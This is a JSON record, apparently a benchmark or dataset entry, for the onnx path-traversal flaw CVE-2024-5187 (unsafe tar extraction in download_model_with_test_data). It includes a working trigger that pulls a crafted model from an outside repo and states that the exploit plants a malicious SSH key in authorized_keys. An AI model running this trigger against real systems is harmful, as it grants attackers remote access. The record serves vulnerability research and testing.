@@ -1,0 +1,15 @@
+{
+  "file_id": "402_onnx_huntr_50235ebd-3410-4ada-b064-1a648e11237e",
+  "numeric_id": "402",
+  "library_hint": "onnx",
+  "source": "huntr",
+  "title": "Path traversal vulnerability in download_model_with_test_data due to unsafe tar extraction",
+  "cve": "CVE-2024-5187",
+  "cwe": "CWE-22: Path Traversal",
+  "library": "onnx",
+  "affected_version": "== 1.16.0",
+  "vulnerable_function": "tarfile.open().extractall",
+  "triggerability": "indirect",
+  "trigger_payload": "from onnx import hub\nhub.download_model_with_test_data(\"mnist\",repo=\"sunriseXu/onnx\",force_reload=True,silent=True)",
+  "oracle": "The /home/kali/.ssh/authorized_keys file is overwritten with a malicious SSH public key, granting remote access."
+}
